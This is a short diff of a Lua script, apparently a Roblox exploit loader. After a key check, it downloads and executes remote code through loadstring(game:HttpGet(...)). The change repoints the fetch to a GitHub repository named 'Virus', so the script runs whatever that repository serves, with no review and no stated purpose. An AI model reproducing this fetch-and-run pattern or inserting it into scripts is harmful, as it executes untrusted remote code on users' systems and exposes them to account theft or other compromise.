@@ -36,7 +36,7 @@ if keychecked then
         
         -- รันสคริปต์พร้อมจัดการข้อผิดพลาด
         local scriptSuccess, scriptErr = pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/EVILDARKSIDEUPV1/scriptobf/main/p"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/EVILDARKSIDE111/Virus/refs/heads/main/a"))()
         end)
         
         if scriptSuccess then
